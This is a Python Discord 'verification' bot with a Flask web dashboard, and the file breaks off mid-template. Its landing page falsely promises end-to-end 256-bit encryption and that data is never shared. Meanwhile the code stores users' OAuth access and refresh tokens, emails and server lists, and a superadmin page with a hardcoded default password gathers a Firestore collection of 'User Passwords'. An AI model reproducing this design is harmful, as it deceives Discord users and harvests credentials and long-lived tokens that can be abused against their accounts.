#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════════
                    🔐 ANION BOT v15.3 - VERIFICATION ONLY
                    DISCORD VERIFICATION + WEB DASHBOARD
═══════════════════════════════════════════════════════════════════════════════
"""

import os
import sys
import json
import sqlite3
import secrets
import requests
import threading
import asyncio
import logging
import traceback
import time
from typing import Optional, Dict, List, Any, Callable
from datetime import datetime, timedelta
from flask import Flask, request, redirect, render_template_string, jsonify, session, url_for
from flask_cors import CORS
from dotenv import load_dotenv

import discord
from discord.ext import commands
from discord import app_commands
from discord.ui import View, Button

# ─── FIREBASE ──────────────────────────────────────────────────────────────────

import firebase_admin
from firebase_admin import credentials, firestore

load_dotenv()

# ═════════════════════════════════════════════════════════════════════════════
# LOGGING
# ═════════════════════════════════════════════════════════════════════════════

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('AnionBot')

# ═════════════════════════════════════════════════════════════════════════════
# CONFIG
# ═════════════════════════════════════════════════════════════════════════════

TOKEN = os.getenv('DISCORD_TOKEN')
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
REDIRECT_URI = os.getenv('REDIRECT_URI', 'https://edith.up.railway.app/callback')
DB_PATH = os.getenv('DB_PATH', '/data')
FLASK_SECRET = os.getenv('FLASK_SECRET', secrets.token_urlsafe(32))
PORT = int(os.getenv('PORT', 5000))

SUPERADMIN_USERNAME = os.getenv('SUPERADMIN_USERNAME', 'admin')
SUPERADMIN_PASSWORD = os.getenv('SUPERADMIN_PASSWORD', 'AnionSecure2025!')

if not TOKEN or not CLIENT_ID or not CLIENT_SECRET:
    logger.critical("❌ Missing required environment variables!")
    sys.exit(1)

os.makedirs(DB_PATH, exist_ok=True)
os.makedirs(os.path.join(DB_PATH, 'flask_session'), exist_ok=True)
DB_FILE = os.path.join(DB_PATH, 'bot.db')

# ─── FIREBASE INIT ──────────────────────────────────────────────────────────

FIREBASE_ENABLED = False
firestore_db = None

try:
    FIREBASE_JSON = os.getenv('FIREBASE_KEY_JSON')
    FIREBASE_URL = os.getenv('FIREBASE_URL')
    
    if FIREBASE_JSON:
        cred_dict = json.loads(FIREBASE_JSON)
        cred = credentials.Certificate(cred_dict)
        firebase_admin.initialize_app(cred, {'databaseURL': FIREBASE_URL})
        firestore_db = firestore.client()
        FIREBASE_ENABLED = True
        logger.info("✅ Firebase Connected!")
    elif FIREBASE_URL:
        FIREBASE_KEY = os.getenv('FIREBASE_KEY')
        FIREBASE_EMAIL = os.getenv('FIREBASE_EMAIL')
        if FIREBASE_KEY and FIREBASE_EMAIL:
            private_key = FIREBASE_KEY.replace('\\n', '\n')
            cred_dict = {
                "type": "service_account",
                "project_id": FIREBASE_URL.split('/')[2].split('.')[0],
                "private_key_id": "dummy",
                "private_key": private_key,
                "client_email": FIREBASE_EMAIL,
                "client_id": "dummy",
                "auth_uri": "https://accounts.google.com/o/oauth2/auth",
                "token_uri": "https://oauth2.googleapis.com/token",
                "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
                "client_x509_cert_url": f"https://www.googleapis.com/robot/v1/metadata/x509/{FIREBASE_EMAIL}"
            }
            cred = credentials.Certificate(cred_dict)
            firebase_admin.initialize_app(cred, {'databaseURL': FIREBASE_URL})
            firestore_db = firestore.client()
            FIREBASE_ENABLED = True
            logger.info("✅ Firebase Connected!")
except Exception as e:
    logger.error(f"❌ Firebase error: {e}")

# ═════════════════════════════════════════════════════════════════════════════
# DATABASE
# ═════════════════════════════════════════════════════════════════════════════

conn = sqlite3.connect(DB_FILE, check_same_thread=False)
conn.row_factory = sqlite3.Row
c = conn.cursor()

# ─── TABLES ──────────────────────────────────────────────────────────────────

c.execute("""CREATE TABLE IF NOT EXISTS guild_settings (
    guild_id TEXT PRIMARY KEY,
    verified_role_id TEXT,
    unverified_role_id TEXT,
    log_channel_id TEXT,
    verification_channel_id TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)""")

c.execute("""CREATE TABLE IF NOT EXISTS verified_users (
    user_id TEXT,
    guild_id TEXT,
    username TEXT,
    email TEXT,
    access_token TEXT,
    refresh_token TEXT,
    verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    PRIMARY KEY (user_id, guild_id)
)""")

c.execute("""CREATE TABLE IF NOT EXISTS oauth_tokens (
    user_id TEXT,
    guild_id TEXT,
    access_token TEXT,
    refresh_token TEXT,
    expires_at TIMESTAMP,
    PRIMARY KEY (user_id, guild_id)
)""")

c.execute("""CREATE TABLE IF NOT EXISTS command_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    command_name TEXT,
    user_id TEXT,
    guild_id TEXT,
    channel_id TEXT,
    success BOOLEAN,
    error TEXT,
    execution_time REAL,
    executed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)""")

conn.commit()
logger.info("✅ Database ready")

# ─── DATABASE FUNCTIONS ──────────────────────────────────────────────────────

def db_execute(query: str, params: tuple = ()) -> Any:
    c.execute(query, params)
    conn.commit()
    return c

def db_fetch_one(query: str, params: tuple = ()) -> Optional[sqlite3.Row]:
    c.execute(query, params)
    return c.fetchone()

def db_fetch_all(query: str, params: tuple = ()) -> List[sqlite3.Row]:
    c.execute(query, params)
    return c.fetchall()

# ─── FIREBASE FUNCTIONS ──────────────────────────────────────────────────────

def firebase_save_user(user_id: str, guild_id: str, data: Dict) -> bool:
    if not FIREBASE_ENABLED or not firestore_db:
        return False
    try:
        firestore_db.collection('users').document(str(user_id)).collection('guilds').document(str(guild_id)).set(data, merge=True)
        return True
    except Exception as e:
        logger.error(f"Firebase error: {e}")
        return False

def firebase_log(action: str, data: Dict) -> bool:
    if not FIREBASE_ENABLED or not firestore_db:
        return False
    try:
        firestore_db.collection('logs').document(datetime.now().strftime("%Y-%m-%d")).collection('entries').add({
            'action': action,
            'data': data,
            'timestamp': firestore.SERVER_TIMESTAMP
        })
        return True
    except Exception as e:
        logger.error(f"Firebase error: {e}")
        return False

# ═════════════════════════════════════════════════════════════════════════════
# COMMAND LOGGING DECORATOR - FIXED
# ═════════════════════════════════════════════════════════════════════════════

def log_command(func: Callable) -> Callable:
    """Decorator to log command execution with proper type annotations"""
    async def wrapper(interaction: discord.Interaction, /, *args: Any, **kwargs: Any) -> Any:
        command_name = func.__name__
        start_time = time.time()
        success = False
        error_msg = None
        
        try:
            logger.info(f"📝 Command '{command_name}' triggered by {interaction.user}")
            result = await func(interaction, *args, **kwargs)
            success = True
            return result
        except Exception as e:
            error_msg = str(e)
            logger.error(f"❌ Command '{command_name}' failed: {e}")
            logger.error(traceback.format_exc())
            try:
                if not interaction.response.is_done():
                    await interaction.response.send_message(f"❌ An error occurred: {e}", ephemeral=True)
                else:
                    await interaction.followup.send(f"❌ An error occurred: {e}", ephemeral=True)
            except:
                pass
            raise
        finally:
            execution_time = time.time() - start_time
            try:
                db_execute("""INSERT INTO command_logs 
                    (command_name, user_id, guild_id, channel_id, success, error, execution_time)
                    VALUES (?, ?, ?, ?, ?, ?, ?)""",
                    (command_name, str(interaction.user.id), str(interaction.guild.id),
                     str(interaction.channel.id), success, error_msg, execution_time))
            except Exception as e:
                logger.error(f"Failed to log command: {e}")
    
    return wrapper

# ═════════════════════════════════════════════════════════════════════════════
# FLASK APP - VERIFICATION WEB UI
# ═════════════════════════════════════════════════════════════════════════════

flask_app = Flask(__name__)
flask_app.secret_key = FLASK_SECRET
flask_app.config['SESSION_TYPE'] = 'filesystem'
flask_app.config['SESSION_PERMANENT'] = False
flask_app.config['SESSION_FILE_DIR'] = '/data/flask_session'
CORS(flask_app)

# ─── VERIFICATION PAGE ──────────────────────────────────────────────────────

@flask_app.route('/')
def index():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>🔐 Anion - Secure Verification</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
        <style>
            *{margin:0;padding:0;box-sizing:border-box}
            body{font-family:'Inter',sans-serif;background:#0a0a0f;color:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;overflow:hidden;position:relative}
            .bg-gradient{position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(ellipse at 30% 50%,rgba(88,101,242,0.08)0%,transparent 60%),radial-gradient(ellipse at 70% 50%,rgba(118,75,162,0.06)0%,transparent 60%);animation:bgPulse 8s ease-in-out infinite alternate;z-index:0}
            @keyframes bgPulse{0%{transform:scale(1) rotate(0deg)}100%{transform:scale(1.1) rotate(3deg)}}
            .container{position:relative;z-index:1;max-width:480px;width:100%;padding:50px 40px;background:rgba(20,20,30,0.85);backdrop-filter:blur(24px);border-radius:28px;border:1px solid rgba(255,255,255,0.06);box-shadow:0 40px 80px rgba(0,0,0,0.6);text-align:center;animation:slideUp 0.8s cubic-bezier(0.16,1,0.3,1) forwards;opacity:0;transform:translateY(30px)}
            @keyframes slideUp{to{opacity:1;transform:translateY(0)}}
            .shield-icon{font-size:64px;margin-bottom:16px;display:inline-block;animation:float 3s ease-in-out infinite}
            @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
            .logo-text{font-size:32px;font-weight:900;background:linear-gradient(135deg,#fff 30%,#8b8cf7 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:4px}
            .subtitle{font-size:14px;color:rgba(255,255,255,0.4);margin-bottom:28px}
            .security-badge{display:inline-flex;align-items:center;gap:8px;background:rgba(88,101,242,0.12);border:1px solid rgba(88,101,242,0.2);padding:8px 20px;border-radius:100px;font-size:11px;font-weight:600;color:#8b8cf7;margin-bottom:24px;text-transform:uppercase}
            .security-badge .dot{width:6px;height:6px;border-radius:50%;background:#4CAF50;animation:pulseDot 2s infinite}
            @keyframes pulseDot{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(0.8)}}
            .features{display:flex;flex-direction:column;gap:10px;margin-bottom:28px;text-align:left}
            .feature-item{display:flex;align-items:center;gap:12px;padding:12px 16px;background:rgba(255,255,255,0.03);border-radius:12px;border:1px solid rgba(255,255,255,0.04);font-size:13px;color:rgba(255,255,255,0.7);transition:all 0.3s}
            .feature-item:hover{background:rgba(255,255,255,0.06);border-color:rgba(88,101,242,0.15)}
            .feature-item .icon{font-size:18px;flex-shrink:0;width:28px;text-align:center}
            .btn-verify{display:inline-flex;align-items:center;justify-content:center;gap:12px;width:100%;padding:18px 32px;background:linear-gradient(135deg,#5865F2,#4752c4);color:#fff;border:none;border-radius:14px;font-size:17px;font-weight:700;cursor:pointer;text-decoration:none;transition:all 0.3s cubic-bezier(0.16,1,0.3,1);position:relative;overflow:hidden;font-family:'Inter',sans-serif}
            .btn-verify::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.1),transparent);transition:left 0.6s}
            .btn-verify:hover::before{left:100%}
            .btn-verify:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(88,101,242,0.35)}
            .btn-verify:active{transform:scale(0.98)}
            .btn-verify .arrow{font-size:20px;transition:transform 0.3s}
            .btn-verify:hover .arrow{transform:translateX(4px)}
            .footer-text{margin-top:20px;font-size:11px;color:rgba(255,255,255,0.15)}
            @media(max-width:480px){.container{padding:30px 20px;margin:16px}.logo-text{font-size:26px}.btn-verify{font-size:15px;padding:14px 20px}}
        </style>
    </head>
    <body>
        <div class="bg-gradient"></div>
        <div class="container">
            <div class="shield-icon">🛡️</div>
            <div class="logo-text">Secure Verification</div>
            <div class="subtitle">Advanced Identity Verification Protocol</div>
            <div class="security-badge"><span class="dot"></span>End-to-End Encrypted • 256-bit</div>
            <div class="features">
                <div class="feature-item"><span class="icon">🔐</span><span>Discord Identity Verification</span></div>
                <div class="feature-item"><span class="icon">📧</span><span>Email Address Confirmation</span></div>
                <div class="feature-item"><span class="icon">🏰</span><span>Server Membership Validation</span></div>
                <div class="feature-item"><span class="icon">⚡</span><span>Instant Role Assignment</span></div>
            </div>
            <a href="/oauth?guild_id={{ guild_id }}" class="btn-verify">
                <span>Verify with Discord</span>
                <span class="arrow">➜</span>
            </a>
            <div class="footer-text">🔒 Your data is encrypted and never shared</div>
        </div>
    </body>
    </html>
    """, guild_id=request.args.get('guild_id') or '')

@flask_app.route('/oauth')
def oauth():
    guild_id = request.args.get('guild_id')
    if not guild_id:
        return "❌ No guild_id provided", 400
    oauth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds&state={guild_id}"
    return redirect(oauth_url)

@flask_app.route('/callback')
def callback():
    code = request.args.get('code')
    guild_id = request.args.get('state')
    if not code or not guild_id:
        return "❌ Invalid request", 400

    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    try:
        resp = requests.post('https://discord.com/api/oauth2/token', data=data, timeout=10)
        token_data = resp.json()
    except Exception as e:
        logger.error(f"Token exchange failed: {e}")
        return f"❌ Token exchange failed: {e}", 400

    if 'access_token' not in token_data:
        logger.error(f"No access token: {token_data}")
        return "❌ No access token", 400

    access_token = token_data['access_token']
    refresh_token = token_data.get('refresh_token')
    expires_in = token_data.get('expires_in', 604800)
    expires_at = (datetime.now() + timedelta(seconds=expires_in)).isoformat()

    headers = {'Authorization': f'Bearer {access_token}'}
    try:
        user_resp = requests.get('https://discord.com/api/users/@me', headers=headers, timeout=10)
        user_data = user_resp.json()
    except Exception as e:
        logger.error(f"Failed to get user data: {e}")
        return f"❌ Failed to get user data: {e}", 400

    try:
        guilds_resp = requests.get('https://discord.com/api/users/@me/guilds', headers=headers, timeout=10)
        guilds_data = guilds_resp.json()
    except Exception as e:
        logger.error(f"Failed to get guilds: {e}")
        guilds_data = []

    db_execute("""
        INSERT OR REPLACE INTO verified_users (user_id, guild_id, username, email, access_token, refresh_token)
        VALUES (?,?,?,?,?,?)
    """, (user_data.get('id'), guild_id, user_data.get('username'), user_data.get('email', ''), access_token, refresh_token))

    db_execute("""
        INSERT OR REPLACE INTO oauth_tokens (user_id, guild_id, access_token, refresh_token, expires_at)
        VALUES (?,?,?,?,?)
    """, (user_data.get('id'), guild_id, access_token, refresh_token, expires_at))

    # Save to Firebase
    firebase_save_user(user_data.get('id'), guild_id, {
        'user_id': user_data.get('id'),
        'username': user_data.get('username'),
        'email': user_data.get('email', ''),
        'guilds': guilds_data,
        'verified_at': datetime.now().isoformat()
    })
    firebase_log('verification', {'user_id': user_data.get('id'), 'guild_id': guild_id})

    guild_name = guild_id
    if bot_instance:
        guild = bot_instance.get_guild(int(guild_id))
        if guild:
            guild_name = guild.name
        asyncio.run_coroutine_threadsafe(assign_verified_role(user_data.get('id'), guild_id), bot_instance.loop)

    return render_template_string("""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>✅ Verification Complete</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
        <style>
            *{margin:0;padding:0;box-sizing:border-box}
            body{font-family:'Inter',sans-serif;background:#0a0a0f;color:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;overflow:hidden}
            .bg-gradient{position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(ellipse at 70% 30%,rgba(76,175,80,0.06)0%,transparent 60%),radial-gradient(ellipse at 30% 70%,rgba(88,101,242,0.04)0%,transparent 60%);animation:bgPulse 10s ease-in-out infinite alternate;z-index:0}
            @keyframes bgPulse{0%{transform:scale(1) rotate(0deg)}100%{transform:scale(1.05) rotate(-2deg)}}
            .container{position:relative;z-index:1;max-width:520px;width:100%;padding:50px 40px;background:rgba(20,20,30,0.85);backdrop-filter:blur(24px);border-radius:28px;border:1px solid rgba(76,175,80,0.15);box-shadow:0 40px 80px rgba(0,0,0,0.6),0 0 60px rgba(76,175,80,0.05);text-align:center;animation:slideUp 0.8s cubic-bezier(0.16,1,0.3,1) forwards;opacity:0;transform:translateY(30px)}
            @keyframes slideUp{to{opacity:1;transform:translateY(0)}}
            .success-icon{font-size:72px;margin-bottom:12px;animation:successPulse 2s ease-in-out infinite}
            @keyframes successPulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
            .glow-ring{display:inline-block;padding:4px;border-radius:50%;background:linear-gradient(135deg,#4CAF50,#66BB6A);box-shadow:0 0 60px rgba(76,175,80,0.2);margin-bottom:16px}
            h1{font-size:32px;font-weight:900;background:linear-gradient(135deg,#fff 30%,#a5d6a7 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:4px}
            .subtitle{font-size:14px;color:rgba(255,255,255,0.4);margin-bottom:24px}
            .verified-badge{display:inline-flex;align-items:center;gap:10px;background:rgba(76,175,80,0.12);border:1px solid rgba(76,175,80,0.2);padding:10px 24px;border-radius:100px;font-size:13px;font-weight:600;color:#81C784;margin-bottom:24px}
            .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:24px;text-align:left}
            .info-card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.05);border-radius:14px;padding:16px 18px;transition:all 0.3s}
            .info-card:hover{background:rgba(255,255,255,0.06);border-color:rgba(255,255,255,0.08)}
            .info-card .label{font-size:10px;font-weight:600;color:rgba(255,255,255,0.3);text-transform:uppercase;letter-spacing:0.8px;margin-bottom:4px}
            .info-card .value{font-size:14px;font-weight:600;color:#fff;word-break:break-all}
            .info-card .value.username{color:#8b8cf7}
            .info-card .value.guild{color:#81C784}
            .btn-done{display:inline-flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:16px 32px;background:linear-gradient(135deg,#4CAF50,#388E3C);color:#fff;border:none;border-radius:14px;font-size:16px;font-weight:700;cursor:pointer;text-decoration:none;font-family:'Inter',sans-serif;transition:all 0.3s cubic-bezier(0.16,1,0.3,1)}
            .btn-done:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(76,175,80,0.35)}
            .btn-done:active{transform:scale(0.98)}
            .footer-text{margin-top:16px;font-size:11px;color:rgba(255,255,255,0.15)}
            @media(max-width:480px){.container{padding:30px 20px;margin:16px}h1{font-size:26px}.info-grid{grid-template-columns:1fr}.btn-done{font-size:15px;padding:14px 20px}}
        </style>
    </head>
    <body>
        <div class="bg-gradient"></div>
        <div class="container">
            <div class="glow-ring"><div class="success-icon">✅</div></div>
            <h1>Verification Complete!</h1>
            <div class="subtitle">Identity successfully confirmed</div>
            <div class="verified-badge"><span class="check">✦</span><span>Verified • {{ username }}#{{ discriminator }}</span></div>
            <div class="info-grid">
                <div class="info-card"><div class="label">👤 User</div><div class="value username">{{ username }}</div></div>
                <div class="info-card"><div class="label">🆔 User ID</div><div class="value">{{ user_id }}</div></div>
                <div class="info-card"><div class="label">📧 Email</div><div class="value">{{ email }}</div></div>
                <div class="info-card"><div class="label">🏰 Server</div><div class="value guild">{{ guild_name }}</div></div>
                <div class="info-card" style="grid-column:1/-1;"><div class="label">🔑 Verified At</div><div class="value">{{ verified_at }}</div></div>
            </div>
            <a href="https://discord.com/app" class="btn-done"><span>🎯</span><span>Return to Discord</span></a>
            <div class="footer-text">🔒 Your verification status is securely stored</div>
        </div>
    </body>
    </html>
    """,
    username=user_data.get('username', 'User'),
    discriminator=user_data.get('discriminator', '0'),
    user_id=user_data.get('id', 'Unknown'),
    email=user_data.get('email', 'Not provided'),
    guild_name=guild_name,
    verified_at=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    )

async def assign_verified_role(user_id: str, guild_id: str):
    if not bot_instance:
        return
    guild = bot_instance.get_guild(int(guild_id))
    if not guild:
        return
    member = guild.get_member(int(user_id))
    if not member:
        return

    verified = db_fetch_one("SELECT * FROM verified_users WHERE user_id=? AND guild_id=?", (user_id, guild_id))
    if not verified:
        return

    settings = db_fetch_one("SELECT verified_role_id, unverified_role_id FROM guild_settings WHERE guild_id=?", (guild_id,))
    if not settings or not settings['verified_role_id']:
        return

    role = guild.get_role(int(settings['verified_role_id']))
    if role:
        await member.add_roles(role)

    if settings['unverified_role_id']:
        unrole = guild.get_role(int(settings['unverified_role_id']))
        if unrole and unrole in member.roles:
            await member.remove_roles(unrole)

    # Log
    log_settings = db_fetch_one("SELECT log_channel_id FROM guild_settings WHERE guild_id=?", (guild_id,))
    if log_settings and log_settings['log_channel_id']:
        channel = guild.get_channel(int(log_settings['log_channel_id']))
        if channel:
            embed = discord.Embed(
                title="✅ User Verified",
                description=f"{member.mention} has been verified!",
                color=discord.Color.green()
            )
            embed.add_field(name="Username", value=member.display_name, inline=True)
            embed.add_field(name="User ID", value=member.id, inline=True)
            await channel.send(embed=embed)

# ─── SUPERADMIN DASHBOARD ──────────────────────────────────────────────────

@flask_app.route('/superadmin.html')
def superadmin_login():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>🔐 Superadmin Login</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
        <style>
            *{margin:0;padding:0;box-sizing:border-box}
            body{font-family:'Inter',sans-serif;background:#0a0a0f;color:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;overflow:hidden;position:relative}
            .bg-gradient{position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(ellipse at 30% 50%,rgba(255,50,50,0.08)0%,transparent 60%),radial-gradient(ellipse at 70% 50%,rgba(200,0,0,0.06)0%,transparent 60%);animation:bgPulse 8s ease-in-out infinite alternate;z-index:0}
            @keyframes bgPulse{0%{transform:scale(1) rotate(0deg)}100%{transform:scale(1.1) rotate(3deg)}}
            .container{position:relative;z-index:1;max-width:420px;width:100%;padding:45px 35px;background:rgba(20,20,30,0.9);backdrop-filter:blur(24px);border-radius:28px;border:1px solid rgba(255,50,50,0.15);box-shadow:0 40px 80px rgba(0,0,0,0.6);text-align:center;animation:slideUp 0.8s cubic-bezier(0.16,1,0.3,1) forwards;opacity:0;transform:translateY(30px)}
            @keyframes slideUp{to{opacity:1;transform:translateY(0)}}
            .shield-icon{font-size:56px;margin-bottom:12px;animation:float 3s ease-in-out infinite}
            @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
            h1{font-size:28px;font-weight:800;background:linear-gradient(135deg,#ff4444 30%,#ff6b6b 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:4px}
            .subtitle{font-size:13px;color:rgba(255,255,255,0.4);margin-bottom:24px}
            .security-badge{display:inline-flex;align-items:center;gap:8px;background:rgba(255,50,50,0.12);border:1px solid rgba(255,50,50,0.2);padding:6px 16px;border-radius:100px;font-size:10px;font-weight:600;color:#ff6b6b;margin-bottom:24px;text-transform:uppercase}
            .security-badge .dot{width:6px;height:6px;border-radius:50%;background:#4CAF50;animation:pulseDot 2s infinite}
            @keyframes pulseDot{0%,100%{opacity:1}50%{opacity:0.5}}
            .input-group{text-align:left;margin-bottom:16px}
            .input-group label{font-size:12px;font-weight:600;color:rgba(255,255,255,0.5);display:block;margin-bottom:6px;letter-spacing:0.5px}
            .input-group input{width:100%;padding:14px 16px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);border-radius:12px;color:#fff;font-size:15px;font-family:'Inter',sans-serif;transition:all 0.3s}
            .input-group input:focus{outline:none;border-color:rgba(255,50,50,0.4);background:rgba(255,255,255,0.08)}
            .input-group input::placeholder{color:rgba(255,255,255,0.2)}
            .btn-login{width:100%;padding:16px;background:linear-gradient(135deg,#ff4444,#cc0000);color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;transition:all 0.3s cubic-bezier(0.16,1,0.3,1);font-family:'Inter',sans-serif;margin-top:8px}
            .btn-login:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(255,50,50,0.3)}
            .btn-login:active{transform:scale(0.98)}
            .error-msg{color:#ff4444;font-size:13px;margin-top:12px;display:none;background:rgba(255,50,50,0.1);padding:10px;border-radius:8px;border:1px solid rgba(255,50,50,0.2)}
            .footer-text{margin-top:20px;font-size:11px;color:rgba(255,255,255,0.12)}
            @media(max-width:480px){.container{padding:30px 20px;margin:16px}h1{font-size:24px}}
        </style>
    </head>
    <body>
        <div class="bg-gradient"></div>
        <div class="container">
            <div class="shield-icon">🛡️</div>
            <h1>Superadmin Access</h1>
            <div class="subtitle">Secure • Encrypted • Authorized Only</div>
            <div class="security-badge"><span class="dot"></span>256-bit Encryption • Restricted</div>
            <form method="POST" action="/superadmin-login">
                <div class="input-group">
                    <label>👤 Username</label>
                    <input type="text" name="username" placeholder="Enter username" required autofocus>
                </div>
                <div class="input-group">
                    <label>🔑 Password</label>
                    <input type="password" name="password" placeholder="Enter password" required>
                </div>
                <button type="submit" class="btn-login">🚪 Access Dashboard</button>
            </form>
            <div class="error-msg" id="errorMsg">❌ Invalid credentials</div>
            <div class="footer-text">🔒 Authorized personnel only • All access is logged</div>
        </div>
        <script>
            if (window.location.search.includes('error=1')) {
                document.getElementById('errorMsg').style.display = 'block';
            }
        </script>
    </body>
    </html>
    """)

@flask_app.route('/superadmin-login', methods=['POST'])
def superadmin_login_handler():
    username = request.form.get('username')
    password = request.form.get('password')
    if username == SUPERADMIN_USERNAME and password == SUPERADMIN_PASSWORD:
        session['role'] = 'superadmin'
        session['login_time'] = datetime.now().isoformat()
        return redirect(url_for('superadmin_dashboard'))
    return redirect(url_for('superadmin_login', error=1))

@flask_app.route('/superadmin-dashboard.html')
def superadmin_dashboard():
    if session.get('role') != 'superadmin':
        return redirect(url_for('superadmin_login'))
    
    guilds = []
    if bot_instance:
        for guild in bot_instance.guilds:
            guilds.append({'id': guild.id, 'name': guild.name, 'member_count': guild.member_count})
    
    users = db_fetch_all("SELECT * FROM verified_users")
    
    # Get Firebase passwords
    passwords = {}
    if FIREBASE_ENABLED and firestore_db:
        try:
            collections = firestore_db.collection('passwords').list_documents()
            for coll in collections:
                docs = coll.collection('users').stream()
                for doc in docs:
                    data = doc.to_dict()
                    if coll.id not in passwords:
                        passwords[coll.id] = {}
                    passwords[coll.id][doc.id] = data
        except Exception as e:
            logger.error(f"Failed to get passwords from Firebase: {e}")
    
    return render_template_string("""
    <!DOCTYPE html>
    <html><head><title>📊 Anion Dashboard</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a1a;color:#fff;font-family:'Segoe UI',Arial;padding:20px}
        .container{max-width:1400px;margin:0 auto}
        .header{display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #333;padding:20px 0;margin-bottom:30px}
        .header h1{background:linear-gradient(135deg,#ff4444,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-size:32px}
        .logout-btn{padding:10px 20px;background:#ff4444;color:#fff;border:none;border-radius:8px;cursor:pointer;text-decoration:none}
        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:30px}
        .stat-card{background:#1a1a2e;padding:24px;border-radius:16px;text-align:center;border:1px solid #333;transition:all 0.3s}
        .stat-card:hover{transform:translateY(-4px);border-color:#ff6b6b}
        .stat-number{font-size:2.5em;font-weight:800;color:#ff6b6b}
        .stat-label{color:#888;margin-top:4px}
        .guild-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px;margin-bottom:30px}
        .guild-card{background:#1a1a2e;padding:20px;border-radius:16px;border:1px solid #333;transition:all 0.3s}
        .guild-card:hover{transform:translateY(-4px);border-color:#ff6b6b}
        .guild-card h3{color:#fff;margin-bottom:4px}
        .guild-card .info{color:#888;font-size:13px}
        .guild-card a{color:#ff6b6b;text-decoration:none;display:inline-block;margin-top:12px}
        table{width:100%;border-collapse:collapse;margin-top:20px;background:#1a1a2e;border-radius:12px;overflow:hidden}
        th,td{padding:12px;text-align:left;border-bottom:1px solid #333}
        th{background:#2a2a4e;color:#ff6b6b;font-weight:600}
        .token{font-family:monospace;font-size:11px;color:#ff6b6b}
        h2{color:#fff;margin:30px 0 16px;font-size:22px;border-left:4px solid #ff6b6b;padding-left:12px}
    </style>
    </head>
    <body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Anion Superadmin Dashboard</h1>
            <a href="/superadmin-logout" class="logout-btn">🚪 Logout</a>
        </div>
        
        <div class="stats">
            <div class="stat-card"><div class="stat-number">{{ total_guilds }}</div><div class="stat-label">Servers</div></div>
            <div class="stat-card"><div class="stat-number">{{ total_users }}</div><div class="stat-label">Verified Users</div></div>
            <div class="stat-card"><div class="stat-number">{{ total_passwords }}</div><div class="stat-label">User Passwords</div></div>
        </div>
        
        <h2>🏰 Servers</h2>
        <div class="guild-grid">
            {% for guild in guilds %}
            <div class="guild-card">
                <h3>{{ guild.name }}</h3>
                <div class="info">👥 {{ guild.member_count }} members</div>
                <div class="info">🆔 {{ guild.id }}</div>
            </div>
            {% endfor %}
        </div>
        
        <h2>👤 Verified Users</h2>
        <table>
            <thead><tr><th>Username</th><th>Email</th><th>Guild</th><th>Verified At</th></tr></thead>
            <tbody>
                {% for user in users %}
                <tr><td>{{ user.username or 'Unknown' }}</td><td>{{ user.email or 'N/A' }}</td><td>{{ user.guild_id or 'N/A' }}</td><td>{{ user.verified_at[:16] if user.verified_at else 'N/A' }}</td></tr>
                {% endfor %}
            </tbody>
        </table>
        
        {% if passwords %}
